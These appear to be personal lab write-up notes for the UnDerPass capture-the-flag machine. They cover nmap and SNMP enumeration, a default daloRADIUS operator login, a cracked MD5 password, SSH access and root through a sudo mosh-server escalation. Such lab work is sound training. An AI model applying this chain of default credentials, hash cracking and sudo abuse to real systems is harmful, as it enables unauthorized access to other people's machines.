
TARGET: 10.129.231.213
ME: 10.10.15.8
# NMAP

```
└─$ sudo nmap -sC -sV -p- -Pn --max-retries=1 10.129.231.213
[sudo] password for xmen: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 19:12 -0400
Nmap scan report for 10.129.231.213
Host is up (0.069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# Port 80

This is Apache httpd 2.4.52

Ran dirb to try to get anything besides the base Apache installation page

# Port 22

This version of SSH seems to possibly be vulnerable by way of a regression which introduced the RegreSSHion vulnerabilty - https://blog.qualys.com/vulnerabilities-threat-research/2024/07/01/regresshion-remote-unauthenticated-code-execution-vulnerability-in-openssh-server

Tried to run PoC exploit code against it but did not get much traction there either

# NMAP UDP

Ran nmap against the top 50 UDP ports and SNMP seemed to come back as an open port:

```
└─$ sudo nmap -sU -sV --top-ports=50 -Pn --max-retries=1 10.129.231.213 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 19:27 -0400
Warning: 10.129.231.213 giving up on port because retransmission cap hit (1).
Nmap scan report for 10.129.231.213
Host is up (0.027s latency).
Not shown: 42 open|filtered udp ports (no-response)
PORT     STATE  SERVICE       VERSION
67/udp   closed dhcps
139/udp  closed netbios-ssn
161/udp  open   snmp          SNMPv1 server; net-snmp SNMPv3 server (public)
518/udp  closed ntalk
631/udp  closed ipp
998/udp  closed puparp
2049/udp closed nfs
3456/udp closed IISrpc-or-vat
Service Info: Host: UnDerPass.htb is the only daloradius server in the basin!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.04 seconds
```

# SNMP

Ran the snmp scripts from NMAP as per [[snmp-pentesting]]

```
└─$ nmap -sU --script snmp* -p161 10.129.231.213    
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 19:52 -0400
Nmap scan report for 10.129.231.213
Host is up (0.027s latency).

PORT    STATE SERVICE
161/udp open  snmp
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: c7ad5c4856d1cf6600000000
|   snmpEngineBoots: 32
|_  snmpEngineTime: 45m48s
| snmp-brute: 
|_  public - Valid credentials
| snmp-sysdescr: Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
|_  System uptime: 45m49.75s (274975 timeticks)

Nmap done: 1 IP address (1 host up) scanned in 14.20 seconds
```

Based on this ouput from snmp-brute script, looks like I can dump the public community. So ran snmpwalk from here:

```
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (283598) 0:47:15.98
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (2) 0:00:00.02
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (3) 0:00:00.03
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (285110) 0:47:31.10
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 08 13 17 36 06 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
```

This points at a user:

```
steve@underpass.htb
```

It also seems to have some mention of Nevada and daloradius which points at daloRADIUS which is a RADIUS platform as described on their website:

```
daloRADIUS is an advanced RADIUS web platform aimed at managing Hotspots and general-purpose ISP deployments. It features rich user management, graphical reporting, accounting, and integrates with GoogleMaps for geo-locating (GIS). daloRADIUS is written in PHP and JavaScript and utilizes a database abstraction layer which means that it supports many database systems, among them the popular MySQL, PostgreSQL, Sqlite, MsSQL, and many others.
```

This seems to point at a daloradius UI on the Apache server from earlier. A little bit of googling pointed at a /var/www/daloradius/app/users path which would lead to /daloradius/app/users for the path on the server as per https://blog.bogdancaraman.com/install-freeradius-daloradius-debian-13/#Fixing_the_Missing_Authentication_Backend_in_daloRADIUS_23_User_Portal_on_80

This did work out as I got directed to a login page on http://underpass.htb/daloradius/app/users/login.php as well as an operators login page on http://underpass.htb/daloradius/app/operators/login.php

# Daloradius (Port 80)

The default login of administrator radius worked only on the operators page. Here, we can grab the only user in the server's database which is svcMosh and their MD5 password hash to crack via john:

```
└─$ john svcMosh_hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Press 'q' or Ctrl-C to abort, almost any other key for status
underwaterfriends (?)     
1g 0:00:00:00 DONE (2026-08-19 20:26) 7.142g/s 21314Kp/s 21314Kc/s 21314KC/s undiamecaiQ..underpants2
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

```
└─$ ssh svcMosh@10.129.231.213
svcMosh@10.129.231.213's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Aug 20 12:27:20 AM UTC 2026

  System load:  0.0               Processes:             224
  Usage of /:   49.6% of 6.56GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.129.231.213
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sat Jan 11 13:27:33 2025 from 10.10.14.62
svcMosh@underpass:~$ 
```

From here sudo -l shows we can run mosh-server via sudo. This was leveraged using [mosh-server GTFOBin](https://gtfobins.org/gtfobins/mosh-server/) instructions using the sudo way of running the server to get root


```
# id
uid=0(root) gid=0(root) groups=0(root)
# cd ~
# dir
root.txt
# cat root.txt
5f1cf7ee558a87a3738ff075cec595c5
```

==DONE==